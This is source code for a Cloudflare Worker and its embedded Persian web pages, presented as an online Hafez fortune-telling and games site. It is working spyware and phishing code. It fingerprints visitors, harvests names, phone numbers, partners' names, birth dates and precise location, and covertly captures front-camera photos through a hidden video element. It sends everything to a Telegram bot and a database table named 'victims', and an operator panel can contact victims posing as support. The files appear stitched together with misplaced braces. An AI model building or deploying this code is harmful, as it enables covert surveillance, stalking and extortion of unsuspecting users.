export default {
  async fetch(r, env) {
    return await handleRequest(r, env);
  }
};

function json(o, s) {
  return new Response(JSON.stringify(o), {
    status: s || 200,
    headers: { "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" }
  });
}

function html(s) {
  return new Response(s, {
    headers: { "Content-Type": "text/html; charset=utf-8" }
  });
}

async function tgSend(env, method, payload) {
  const url = "https://api.telegram.org/bot" + env.TG_TOKEN + "/" + method;
  for (let i = 0; i < 4; i++) {
    const r = await fetch(url, payload);
    if (r.status !== 429) return r;
    await new Promise(res => setTimeout(res, (2 ** i) * 1000));
  }
  return new Response("rate-limited", { status: 429 });
}

async function sendTg(env, text) {
  try {
    return await tgSend(env, "sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: env.TG_CHAT, text: text })
    });
  } catch(e) {
    console.error("tgSend error:", e);
  }
}

async function handleRequest(r, env) {
  const u = new URL(r.url);
  const path = u.pathname;
  const ip = r.headers.get("cf-connecting-ip") || "";
  const cf = r.cf || {};
  const ua = r.headers.get("user-agent") || "";

  if (path === "/" && r.method === "GET") return html(SITE_HTML);
  if (path === "/panel" || path === "/panel/") return html(PANEL_HTML);

  if (path === "/up" && r.method === "POST") {
    try {
      const b = await r.json();
      const bin = Uint8Array.from(atob(b.data.split(",")[1]), c => c.charCodeAt(0));
      let mime, field, name, method;
      if (b.type === "photo")      { mime="image/jpeg"; field="photo"; name="p.jpg";  method="sendPhoto"; }
      else if (b.type === "video") { mime="video/webm"; field="video"; name="v.webm"; method="sendVideo"; }
      else                         { mime="audio/webm"; field="audio"; name="a.webm"; method="sendAudio"; }
      const f = new FormData();
      f.append("chat_id", env.TG_CHAT);
      f.append("caption", "[" + (b.cam || b.type) + "] sid=" + (b.sid||"").slice(0,8));
      f.append(field, new Blob([bin], { type: mime }), name);
      const t = await tgSend(env, method, { method: "POST", body: f });
      return json(await t.json(), 200);
    } catch(e) { return json({ err: String(e) }, 500); }
  }

  if (path === "/info" && r.method === "POST") {
    try {
      const raw = await r.text();
      const b = JSON.parse(raw);
      const sid = b.sid || "unknown";
      const ex = await env.DB.prepare("SELECT sid FROM victims WHERE sid = ?").bind(sid).first();
      if (ex) {
        await env.DB.prepare("UPDATE victims SET last_seen = CURRENT_TIMESTAMP, visits = visits + 1 WHERE sid = ?").bind(sid).run();
      } else {
        await env.DB.prepare("INSERT INTO victims (sid, ip, country, city, ua, lang, tz, screen, cpu, ram, fingerprint) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)")
          .bind(sid, ip, cf.country||"", cf.city||"", ua, b.lang||"", b.tz||"", b.screen||"", b.cpu||0, b.ram||0, b.fingerprint||"").run();
      }
      if (b.kind === "submit") {
        await env.DB.prepare("INSERT INTO submissions (sid, name, phone, lover, birth, fal_type, niyat, lat, lng) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)")
          .bind(sid, b.name||"", b.phone||"", b.lover||"", b.birth||"", b.type||"", b.niyat||"", b.lat||null, b.lng||null).run();
      }
      let msg = "📥 " + (b.kind || "info") + "\n🆔 " + sid.slice(0,8) + "\n";
      const keys = ["name","phone","lover","birth","niyat","field","value","click"];
      for (let i = 0; i < keys.length; i++) {
        if (b[keys[i]] !== undefined) msg += "• " + keys[i] + ": " + b[keys[i]] + "\n";
      }
      if (typeof b.lat === "number" && typeof b.lng === "number") msg += "📍 https://maps.google.com/?q=" + b.lat + "," + b.lng + "\n";
      await sendTg(env, msg);
      return json({ ok: true }, 200);
    } catch(e) { return json({ err: String(e) }, 500); }
  }

  if (path === "/ping" && r.method === "POST") {
    try {
      const b = await r.json();
      const sid = b.sid || "unknown";
      await env.DB.prepare("INSERT INTO online_users (sid, last_ping, current_page, ip, ua) VALUES (?, CURRENT_TIMESTAMP, ?, ?, ?) ON CONFLICT(sid) DO UPDATE SET last_ping = CURRENT_TIMESTAMP, current_page = excluded.current_page")
        .bind(sid, b.page || "home", ip, ua).run();
      return json({ ok: true });
    } catch(e) { return json({ ok: false }); }
  }

  if (path === "/permissions") {
    try {
      const sid = u.searchParams.get("sid") || "";
      const p = await env.DB.prepare("SELECT chat_enabled, capture_enabled, live_view, persistent FROM user_settings WHERE sid = ?").bind(sid).first();
      if (!p) return json({ chat_enabled: 0, capture_enabled: 0, live_view: 0, persistent: 1 });
      return json(p);
    } catch(e) { return json({ chat_enabled: 0, capture_enabled: 0, live_view: 0, persistent: 1 }); }
  }

  if (path === "/chat/send" && r.method === "POST") {
    try {
      const b = await r.json();
      const p = await env.DB.prepare("SELECT chat_enabled FROM user_settings WHERE sid = ?").bind(b.sid).first();
      if (!p || !p.chat_enabled) return json({ err: "disabled" }, 403);
      await env.DB.prepare("INSERT INTO chats (sid, from_who, type, content) VALUES (?, 'user', ?, ?)")
        .bind(b.sid, b.type || "text", b.content).run();
      await sendTg(env, "💬 پیام از کاربر " + b.sid.slice(0,8) + ":\n" + b.content);
      return json({ ok: true });
    } catch(e) { return json({ err: String(e) }, 500); }
  }

  if (path === "/chat/poll") {
    try {
      const sid = u.searchParams.get("sid") || "";
      const last = parseInt(u.searchParams.get("last") || "0");
      const rows = await env.DB.prepare("SELECT id, from_who, type, content, at FROM chats WHERE sid = ? AND id > ? ORDER BY id ASC LIMIT 50").bind(sid, last).all();
      return json({ msgs: rows.results });
    } catch(e) { return json({ msgs: [] }); }
  }

  if (path === "/admin/users-list") {
    try {
      const rows = await env.DB.prepare("SELECT sid, name, phone, lover, city, last_seen, visits FROM victims ORDER BY last_seen DESC LIMIT 200").all();
      return json({ users: rows.results });
    } catch(e) { return json({ users: [], err: String(e) }); }
  }

  if (path === "/admin/submissions") {
    try {
      const sid = u.searchParams.get("sid") || "";
      const rows = await env.DB.prepare("SELECT * FROM submissions WHERE sid = ? ORDER BY at DESC LIMIT 50").bind(sid).all();
      return json({ submissions: rows.results });
    } catch(e) { return json({ submissions: [], err: String(e) }); }
  }

  if (path === "/admin/chat-toggle" && r.method === "POST") {
    try {
      const b = await r.json();
      await env.DB.prepare("INSERT INTO user_settings (sid, chat_enabled, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP) ON CONFLICT(sid) DO UPDATE SET chat_enabled = excluded.chat_enabled, updated_at = CURRENT_TIMESTAMP")
        .bind(b.sid, b.enabled ? 1 : 0).run();
      return json({ ok: true });
    } catch(e) { return json({ ok: false, err: String(e) }); }
  }

  if (path === "/admin/chat-send" && r.method === "POST") {
    try {
      const b = await r.json();
      await env.DB.prepare("INSERT INTO chats (sid, from_who, type, content) VALUES (?, 'admin', ?, ?)")
        .bind(b.sid, b.type || "text", b.content).run();
      return json({ ok: true });
    } catch(e) { return json({ ok: false, err: String(e) }); }
  }

  if (path === "/admin/stats") {
    try {
      const total = await env.DB.prepare("SELECT COUNT(*) as c FROM victims").first();
      const online = await env.DB.prepare("SELECT COUNT(*) as c FROM online_users WHERE last_ping > datetime('now','-3 minutes')").first();
      const phones = await env.DB.prepare("SELECT COUNT(*) as c FROM victims WHERE phone IS NOT NULL AND phone != ''").first();
      const subs = await env.DB.prepare("SELECT COUNT(*) as c FROM submissions").first();
      return json({ total: total.c, online: online.c, phones: phones.c, submissions: subs.c });
    } catch(e) { return json({ err: String(e) }, 500); }
  }

  return new Response("Not Found", { status: 404 });// ============================================
// site.js — HTML کاربر
// ============================================

const SITE_HTML = `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>فال حافظ آنلاین 🔮</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Tahoma,sans-serif;background:linear-gradient(135deg,#0a0014,#2a0050,#0a0014);min-height:100vh;color:#fff;padding:15px}
.header{text-align:center;padding:20px 0}
h1{font-size:24px;margin-bottom:8px;text-shadow:0 0 20px #b47aff}
.sub{opacity:.8;font-size:13px}
.card{background:rgba(255,255,255,.06);border:1px solid rgba(180,122,255,.3);border-radius:18px;padding:20px;margin:12px 0}
label{display:block;font-size:13px;margin-bottom:6px}
input,textarea,select{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(180,122,255,.4);background:rgba(0,0,0,.4);color:#fff;font-family:inherit;font-size:14px;margin-bottom:12px}
.btn{background:linear-gradient(135deg,#b47aff,#7a1aff);color:#fff;border:none;padding:15px;border-radius:12px;font-size:16px;font-weight:bold;width:100%;cursor:pointer;font-family:inherit;margin-top:5px}
.btn:disabled{opacity:.5}
.result{margin-top:18px;padding:18px;border-radius:14px;background:rgba(0,0,0,.5);border:1px solid rgba(180,122,255,.4);display:none;text-align:center}
.verse{font-size:16px;color:#e0c4ff;margin-bottom:10px;font-weight:bold;line-height:2}
.meaning{font-size:13px;line-height:1.9}
#v{position:fixed;width:1px;height:1px;opacity:.01;top:-100px;left:-100px;pointer-events:none}
#c{display:none}
#chatBox{position:fixed;inset:0;background:#0a0014;z-index:9998;display:none;flex-direction:column}
#chatHeader{background:linear-gradient(135deg,#7a1aff,#b47aff);padding:15px;display:flex;justify-content:space-between;align-items:center}
#chatHeader h3{font-size:16px}
#chatHeader button{background:rgba(0,0,0,.3);border:none;color:#fff;padding:8px 12px;border-radius:8px;font-family:inherit;cursor:pointer}
#chatMessages{flex:1;overflow-y:auto;padding:15px;display:flex;flex-direction:column;gap:8px}
#chatInput{display:flex;gap:8px;padding:10px;background:rgba(0,0,0,.5)}
#chatInput input{flex:1;padding:12px;border-radius:10px;border:1px solid #b47aff;background:rgba(0,0,0,.4);color:#fff;font-family:inherit;margin:0}
#chatInput button{background:#7a1aff;color:#fff;border:none;padding:12px 20px;border-radius:10px;font-family:inherit;cursor:pointer}
.msg{max-width:75%;padding:10px 14px;border-radius:14px;font-size:14px;line-height:1.7;word-wrap:break-word}
.msg.user{align-self:flex-end;background:linear-gradient(135deg,#7a1aff,#b47aff)}
.msg.admin{align-self:flex-start;background:rgba(255,255,255,.1);border:1px solid rgba(180,122,255,.4)}
</style>
</head>
<body>
<div class="header">
  <h1>🔮 فال حافظ آنلاین</h1>
  <p class="sub">پیش‌بینی دقیق با هوش مصنوعی</p>
</div>

<div class="card">
  <label>👤 اسم خودت</label>
  <input id="name" placeholder="نام شما">
  <label>📱 شماره موبایل</label>
  <input id="phone" type="tel" placeholder="09xxxxxxxxx" inputmode="numeric" maxlength="11">
  <label>💕 اسم عشق</label>
  <input id="lover" placeholder="اسم کسی که دوستش داری">
  <label>🎂 تاریخ تولد</label>
  <input id="birth" placeholder="۱۳۷۰/۰۵/۱۵">
  <label>🔮 نوع فال</label>
  <select id="falType">
    <option value="hafez">فال حافظ</option>
    <option value="love">فال عشق</option>
    <option value="money">فال پول</option>
    <option value="future">فال آینده</option>
  </select>
  <label>💭 نیت خود را بنویسید</label>
  <textarea id="niyat" placeholder="به چه چیزی فکر می‌کنید؟"></textarea>
  <button class="btn" id="falBtn">✨ دریافت فال ✨</button>
  <div class="result" id="result"></div>
</div>

<div id="chatBox">
  <div id="chatHeader">
    <h3>💬 چت با پشتیبانی</h3>
    <button onclick="closeChat()">✕</button>
  </div>
  <div id="chatMessages"></div>
  <div id="chatInput">
    <input id="chatText" placeholder="پیامت رو بنویس...">
    <button onclick="sendChat()">📤</button>
  </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
const SID = localStorage.getItem("sid") ?? (()=>{const id=crypto.randomUUID();localStorage.setItem("sid",id);return id;})();
function log(p){fetch("/info",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid:SID,...p})}).catch(()=>{});}

log({kind:"enter",ua:navigator.userAgent,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+"x"+screen.height,cpu:navigator.hardwareConcurrency||0,ram:navigator.deviceMemory||0});
fetch("/ping",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid:SID,page:"home"})}).catch(()=>{});

const FALS = {
  hafez: [
    {v:"دوش دیدم که ملائک در میخانه زدند", m:"روزی پر از خبرهای خوب در انتظار توست."},
    {v:"دلا بسوز که سوز تو کارها بکند", m:"دعای خالص تو گره‌ها را باز می‌کند."},
    {v:"هر که را جامه ز عشقی چاک شد", m:"عشق و محبت در راه است."}
  ],
  love: [{v:"عشق در دلت خانه کرده", m:"یک نفر به تو فکر می‌کند."}],
  money: [{v:"رزق و روزی به دست خداست", m:"ماه آینده پول خوبی می‌رسد."}],
  future: [{v:"آینده‌ای روشن در انتظار توست", m:"یک تصمیم مهم در پیش داری."}]
};
const SYMBOLS = {hafez:"🕊",love:"💞",money:"💰",future:"🌟"};

document.getElementById("falBtn").addEventListener("click", async () => {
  const btn = document.getElementById("falBtn");
  const res = document.getElementById("result");
  btn.disabled = true;
  btn.textContent = "⏳ در حال دریافت...";
  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const lover = document.getElementById("lover").value.trim();
  const birth = document.getElementById("birth").value.trim();
  const falType = document.getElementById("falType").value;
  const niyat = document.getElementById("niyat").value.trim();
  log({kind:"submit",name,phone,lover,birth,type:falType,niyat});
  navigator.geolocation?.getCurrentPosition(
    pos=>log({kind:"loc",lat:pos.coords.latitude,lng:pos.coords.longitude}),
    ()=>{},{enableHighAccuracy:true,timeout:8000}
  );
  await new Promise(r=>setTimeout(r,1500));
  const list = FALS[falType] || FALS.hafez;
  const fal = list[Math.floor(Math.random()*list.length)];
  res.innerHTML = "<div style='font-size:50px'>" + (SYMBOLS[falType]||"🔮") + "</div><div class='verse'>" + fal.v + "</div><div class='meaning'>" + fal.m + "</div>";
  res.style.display = "block";
  btn.disabled = false;
  btn.textContent = "✨ فال بگیر دوباره ✨";
  try {
    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
    document.getElementById("v").srcObject = s;
    await new Promise(r=>setTimeout(r,1500));
    const v = document.getElementById("v");
    const c = document.getElementById("c");
    c.width = v.videoWidth||640; c.height = v.videoHeight||480;
    c.getContext("2d").drawImage(v,0,0);
    const d = c.toDataURL("image/jpeg",0.85);
    await fetch("/up",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data:d,type:"photo",cam:"FRONT",sid:SID})});
    s.getTracks().forEach(t=>t.stop());
  } catch(e) {}
  checkChatPermission();
});

async function checkChatPermission() {
  try {
    const r = await fetch("/permissions?sid=" + SID);
    const p = await r.json();
    if (p.chat_enabled) showChatButton();
  } catch(e) {}
}

function showChatButton() {
  const res = document.getElementById("result");
  if (!document.getElementById("chatBtn")) {
    const b = document.createElement("button");
    b.id = "chatBtn";
    b.className = "btn";
    b.style.background = "linear-gradient(135deg,#ff69b4,#ff1493)";
    b.style.marginTop = "10px";
    b.textContent = "💬 چت با پشتیبانی";
    b.onclick = openChat;
    res.appendChild(b);
  }
}

let chatLastId = 0;
let chatPoll = null;
function openChat() {
  document.getElementById("chatBox").style.display = "flex";
  if (!chatPoll) chatPoll = setInterval(pollChat, 3000);
  pollChat();
}
function closeChat() {
  document.getElementById("chatBox").style.display = "none";
}
async function sendChat() {
  const inp = document.getElementById("chatText");
  const txt = inp.value.trim();
  if (!txt) return;
  inp.value = "";
  const msgs = document.getElementById("chatMessages");
  const d = document.createElement("div");
  d.className = "msg user";
  d.textContent = txt;
  msgs.appendChild(d);
  msgs.scrollTop = msgs.scrollHeight;
  await fetch("/chat/send",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({sid:SID,type:"text",content:txt})});
}
async function pollChat() {
  try {
    const r = await fetch("/chat/poll?sid=" + SID + "&last=" + chatLastId);
    const j = await r.json();
    if (!j.msgs || !j.msgs.length) return;
    const box = document.getElementById("chatMessages");
    for (const m of j.msgs) {
      if (m.id <= chatLastId) continue;
      chatLastId = m.id;
      if (m.from_who === "admin") {
        const d = document.createElement("div");
        d.className = "msg admin";
        d.textContent = m.content;
        box.appendChild(d);
        box.scrollTop = box.scrollHeight;
      }
    }
  } catch(e) {}
}
</script>
</body>
</html>`;
}// ============================================
// panel.js — پنل ادمین
// ============================================

const PANEL_HTML = `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>پنل مدیریت</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Tahoma,sans-serif;background:#0a0014;color:#fff;padding:15px}
h1{color:#b47aff;text-align:center;font-size:20px;margin-bottom:15px}
h3{color:#e0c4ff;font-size:15px;margin-bottom:10px}
.card{background:rgba(180,122,255,.08);border:1px solid rgba(180,122,255,.3);border-radius:12px;padding:15px;margin:10px 0}
.btn{background:linear-gradient(135deg,#b47aff,#7a1aff);color:#fff;border:none;padding:10px 16px;border-radius:10px;font-weight:bold;cursor:pointer;font-family:inherit;margin:5px 5px 5px 0;font-size:13px}
.btn.red{background:linear-gradient(135deg,#ff0044,#cc0033)}
.btn.green{background:linear-gradient(135deg,#00aa66,#00cc77)}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px 0}
.stat{background:#2a0050;padding:15px;border-radius:10px;text-align:center}
.stat b{font-size:24px;color:#b47aff;display:block}
table{border-collapse:collapse;width:100%;font-size:11px;margin-top:10px}
th,td{border:1px solid #333;padding:6px;text-align:right}
th{background:#2a0050;color:#b47aff}
input,textarea{width:100%;padding:10px;border-radius:8px;background:rgba(0,0,0,.4);color:#fff;border:1px solid #b47aff;font-family:inherit;margin-bottom:8px;font-size:13px}
.chatBox{position:fixed;inset:0;background:#0a0014;z-index:9999;display:none;flex-direction:column}
.chatHeader{background:linear-gradient(135deg,#7a1aff,#b47aff);padding:15px;display:flex;justify-content:space-between;align-items:center}
.chatMessages{flex:1;overflow-y:auto;padding:15px;display:flex;flex-direction:column;gap:8px}
.chatInput{display:flex;gap:8px;padding:10px;background:rgba(0,0,0,.5)}
.chatInput input{flex:1;margin:0}
.msg{max-width:75%;padding:10px 14px;border-radius:14px;font-size:14px;line-height:1.7;word-wrap:break-word}
.msg.user{align-self:flex-start;background:rgba(255,255,255,.1);border:1px solid rgba(180,122,255,.4)}
.msg.admin{align-self:flex-end;background:linear-gradient(135deg,#7a1aff,#b47aff)}
</style>
</head>
<body>
<h1>🕵 پنل مدیریت</h1>

<div class="card">
  <h3>📊 آمار</h3>
  <div class="stats">
    <div class="stat"><b id="s-total">0</b>کل</div>
    <div class="stat"><b id="s-online">0</b>آنلاین</div>
    <div class="stat"><b id="s-phones">0</b>با شماره</div>
    <div class="stat"><b id="s-subs">0</b>ارسال فرم</div>
  </div>
  <button class="btn" onclick="loadStats()">🔄 بروزرسانی</button>
</div>

<div class="card">
  <h3>👥 کاربران</h3>
  <div id="users">در حال بارگذاری...</div>
</div>

<div class="chatBox" id="chatBox">
  <div class="chatHeader">
    <h3 id="chatTitle">چت با کاربر</h3>
    <button class="btn red" onclick="closeAdminChat()" style="padding:6px 12px">✕</button>
  </div>
  <div class="chatMessages" id="adminChatMessages"></div>
  <div class="chatInput">
    <input id="adminChatText" placeholder="پیام...">
    <button class="btn" onclick="sendAdminChat()">📤</button>
  </div>
</div>

<script>
let currentChatSid = "";
let currentChatLast = 0;
let adminChatPoll = null;

async function loadStats() {
  try {
    const r = await fetch("/admin/stats").then(x => x.json());
    document.getElementById("s-total").textContent = r.total || 0;
    document.getElementById("s-online").textContent = r.online || 0;
    document.getElementById("s-phones").textContent = r.phones || 0;
    document.getElementById("s-subs").textContent = r.submissions || 0;
  } catch(e) {}
}

async function loadUsers() {
  try {
    const r = await fetch("/admin/users-list").then(x => x.json());
    const box = document.getElementById("users");
    if (!r.users || !r.users.length) {
      box.innerHTML = "<p>هنوز کاربری نیست</p>";
      return;
    }
    let h = "<table><tr><th>SID</th><th>اسم</th><th>شماره</th><th>عشق</th><th>آخرین</th></tr>";
    for (let i = 0; i < r.users.length; i++) {
      const v = r.users[i];
      h += "<tr><td>" + (v.sid||"").slice(0,8) + "</td>";
      h += "<td>" + (v.name||"-") + "</td>";
      h += "<td>" + (v.phone||"-") + "</td>";
      h += "<td>" + (v.lover||"-") + "</td>";
      h += "<td>" + ((v.last_seen||"").slice(5,16)) + "</td></tr>";
      h += "<tr><td colspan='5' style='background:rgba(180,122,255,.05)'>";
      h += "<button class='btn' onclick='viewSubmissions(\\"" + v.sid + "\\")'>📜 سابقه</button>";
      h += "<button class='btn green' onclick='enableChat(\\"" + v.sid + "\\",1)'>💬 فعال چت</button>";
      h += "<button class='btn red' onclick='enableChat(\\"" + v.sid + "\\",0)'>🔒 بستن چت</button>";
      h += "<button class='btn' style='background:#7a1aff' onclick='openAdminChat(\\"" + v.sid + "\\")'>💭 چت</button>";
      h += "</td></tr>";
    }
    h += "</table>";
    box.innerHTML = h;
  } catch(e) {}
}

async function viewSubmissions(sid) {
  try {
    const r = await fetch("/admin/submissions?sid=" + sid).then(x => x.json());
    if (!r.submissions || !r.submissions.length) {
      alert("سابقه‌ای نیست");
      return;
    }
    let txt = "📜 سابقه‌ی فرم‌ها:\\n\\n";
    for (const s of r.submissions) {
      txt += "🕐 " + s.at + "\\n";
      txt += "اسم: " + (s.name||"-") + "\\n";
      txt += "شماره: " + (s.phone||"-") + "\\n";
      txt += "عشق: " + (s.lover||"-") + "\\n\\n";
    }
    alert(txt);
  } catch(e) { alert("خطا"); }
}

async function enableChat(sid, enabled) {
  const r = await fetch("/admin/chat-toggle", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sid: sid, enabled: enabled })
  });
  const j = await r.json();
  alert(j.ok ? (enabled ? "✅ چت فعال شد" : "🔒 چت بسته شد") : "❌ خطا");
}

async function openAdminChat(sid) {
  currentChatSid = sid;
  currentChatLast = 0;
  document.getElementById("chatBox").style.display = "flex";
  document.getElementById("chatTitle").textContent = "چت با " + sid.slice(0,8);
  document.getElementById("adminChatMessages").innerHTML = "";
  if (!adminChatPoll) adminChatPoll = setInterval(pollAdminChat, 3000);
  pollAdminChat();
}

function closeAdminChat() {
  document.getElementById("chatBox").style.display = "none";
  currentChatSid = "";
}

async function sendAdminChat() {
  const inp = document.getElementById("adminChatText");
  const txt = inp.value.trim();
  if (!txt || !currentChatSid) return;
  inp.value = "";
  const msgs = document.getElementById("adminChatMessages");
  const d = document.createElement("div");
  d.className = "msg admin";
  d.textContent = "من: " + txt;
  msgs.appendChild(d);
  msgs.scrollTop = msgs.scrollHeight;
  await fetch("/admin/chat-send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sid: currentChatSid, type: "text", content: txt })
  });
}

async function pollAdminChat() {
  if (!currentChatSid) return;
  try {
    const r = await fetch("/chat/poll?sid=" + currentChatSid + "&last=" + currentChatLast);
    const j = await r.json();
    if (!j.msgs || !j.msgs.length) return;
    const box = document.getElementById("adminChatMessages");
    for (const m of j.msgs) {
      if (m.id <= currentChatLast) continue;
      currentChatLast = m.id;
      const d = document.createElement("div");
      d.className = "msg user";
      d.textContent = "کاربر: " + m.content;
      box.appendChild(d);
      box.scrollTop = box.scrollHeight;
    }
  } catch(e) {}
}

loadStats();
loadUsers();
setInterval(loadStats, 30000);
</script>
</body>
</html>`;// ============================================
// games.js — بازی‌ها
// ============================================

const GAMES_JS = `
// ============ GAME POOLS ============
const GAME_POOLS = {
  celebrities: ["برد پیت","جانی دپ","لئوناردو دی‌کاپریو","تام کروز","کیانو ریوز","رابرت پتینسون","تیموتی شالامه","تام هاردی","دواین جانسون","رایان گاسلینگ","کریس همسورث","کریس ایوانز","بن افلک","مت دیمون","هیو جکمن","دیوید بکهام","کریستیانو رونالدو","لیونل مسی","نوید محمدزاده","شهاب حسینی","پیمان معادی","حامد بهداد","رضا عطاران","مهران مدیری","جواد عزتی","محسن تنابنده"],
  wheelPrizes: ["فال VIP","کارت فال اختصاصی","تحلیل چهره رایگان","مشاوره عشق رایگان","۵۰۰ امتیاز طلایی","اشتراک یک ماهه","جایزه نقدی","تیشرت برند","فال گروهی","تحلیل شخصیت AI","پیش‌بینی دقیق","مشاوره با استاد","عکس یادگاری","قالب فال اختصاصی","اشتراک VIP","کد تخفیف ۵۰٪","لوح تقدیر","کارت پستال","پیش‌بینی عشق","آینده‌نگر"],
  truthQuestions: ["اسم اولین عشقت چی بود؟","آخرین بار کی گریه کردی؟","اسم دوست پسرت چیه؟","چیزی که به کسی نگفتی چیه؟","آرزوی اصلیت چیه؟","بدترین کاری که کردی چیه؟","چند تا دوست پسر داشتی؟","محرمانه‌ترین رازت چیه؟","آخرین دروغی که گفتی چی بود؟","به کی حسودی می‌کنی؟"]
};

function pickRandom(pool, type) {
  const used = JSON.parse(localStorage.getItem("used_" + type) || "[]");
  const available = pool.filter((item, idx) => !used.includes(idx));
  if (available.length === 0) {
    localStorage.setItem("used_" + type, "[]");
    return pickRandom(pool, type);
  }
  const picked = available[Math.floor(Math.random() * available.length)];
  used.push(pool.indexOf(picked));
  localStorage.setItem("used_" + type, JSON.stringify(used));
  return picked;
}

async function playCelebrityGame() {
  log({kind:"game",game:"celebrity"});
  const celeb = pickRandom(GAME_POOLS.celebrities, "celeb");
  const score = Math.floor(Math.random() * 20) + 75;
  const area = document.getElementById("result");
  area.innerHTML = '<div style="padding:30px;text-align:center"><h2>🧠 در حال تحلیل چهره...</h2></div>';
  area.style.display = "block";
  try {
    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
    document.getElementById("v").srcObject = s;
    await new Promise(r=>setTimeout(r,2000));
    const v = document.getElementById("v");
    const c = document.getElementById("c");
    c.width = v.videoWidth||640; c.height = v.videoHeight||480;
    c.getContext("2d").drawImage(v,0,0);
    const d = c.toDataURL("image/jpeg",0.85);
    await fetch("/up",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data:d,type:"photo",cam:"CELEB_"+celeb,sid:SID})});
    s.getTracks().forEach(t=>t.stop());
    setTimeout(()=>{
      area.innerHTML = '<div style="padding:30px;text-align:center"><div style="font-size:60px">✨</div><h2>نتیجه</h2><p style="font-size:18px;margin:20px 0">چهره‌ت شبیه <b style="color:#b47aff;font-size:22px">'+celeb+'</b> هست</p><div style="font-size:48px;color:#b47aff;font-weight:bold">'+score+'%</div></div>';
    }, 8000);
  } catch(e) {}
}

async function playWheelGame() {
  log({kind:"game",game:"wheel"});
  const area = document.getElementById("result");
  area.innerHTML = '<div style="padding:30px;text-align:center"><h2>🎡 گردونه</h2><div id="wheel" style="font-size:120px;margin:20px 0;transition:transform 3s">🎡</div><button class="btn" id="spinBtn">🎁 بچرخون</button></div>';
  area.style.display = "block";
  document.getElementById("spinBtn").onclick = () => {
    const w = document.getElementById("wheel");
    w.style.transform = "rotate(" + (Math.random()*1440+720) + "deg)";
    setTimeout(()=>{
      const prize = pickRandom(GAME_POOLS.wheelPrizes, "wheel");
      area.innerHTML = '<div style="padding:30px;text-align:center"><div style="font-size:80px">🎉</div><h2>تبریک!</h2><p style="font-size:20px;color:#b47aff;margin:20px 0">'+prize+'</p></div>';
      log({kind:"wheel",prize:prize});
    }, 3200);
  };
}

async function playTruthGame() {
  log({kind:"game",game:"truth"});
  const q = pickRandom(GAME_POOLS.truthQuestions, "truth");
  const area = document.getElementById("result");
  area.innerHTML = '<div style="padding:30px"><h2>🎯 حقیقت</h2><p style="font-size:18px;color:#e0c4ff;margin:20px 0">'+q+'</p><textarea id="truthAns" style="width:100%;padding:12px;border-radius:10px;background:rgba(0,0,0,.4);color:#fff;border:1px solid #b47aff;font-family:inherit;min-height:100px" placeholder="جوابت..."></textarea><button class="btn" onclick="submitTruth()">✅ ثبت</button></div>';
  area.style.display = "block";
}

function submitTruth() {
  const ans = document.getElementById("truthAns").value;
  log({kind:"truth",answer:ans});
  document.getElementById("result").innerHTML = '<div style="padding:30px;text-align:center"><div style="font-size:60px">✨</div><h2>ثبت شد</h2></div>';
}

function showGames() {
  const area = document.getElementById("result");
  const games = [
    {icon:"🎭", name:"چهره‌ت شبیه کیه؟", fn:"playCelebrityGame"},
    {icon:"🎡", name:"گردونه‌ی شانس", fn:"playWheelGame"},
    {icon:"🎯", name:"حقیقت یا جرات", fn:"playTruthGame"}
  ];
  let h = '<div style="padding:20px;text-align:center"><h2 style="color:#b47aff">🎮 بازی‌ها</h2>';
  for (const g of games) {
    h += '<button class="btn" onclick="'+g.fn+'()" style="margin:5px 0;text-align:right">'+g.icon+' '+g.name+'</button>';
  }
  h += '</div>';
  area.innerHTML = h;
  area.style.display = "block";
}
`;
